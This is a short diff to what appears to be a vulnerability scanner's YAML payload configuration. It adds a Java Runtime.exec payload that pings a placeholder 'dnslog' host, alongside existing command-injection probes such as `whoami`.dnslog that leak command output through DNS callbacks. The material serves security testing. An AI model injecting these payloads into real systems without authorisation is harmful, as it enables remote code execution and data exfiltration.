@@ -49,6 +49,7 @@ paramPollution:
     `whoami`.dnslog
     http://dnslog/
     ping+-nc+1+dnslog
+    exec(java.lang.Runtime.getRuntime(),"ping+-nc+1+dnslog")
 
 headerPollution:
   status: #on为开启 off为关闭
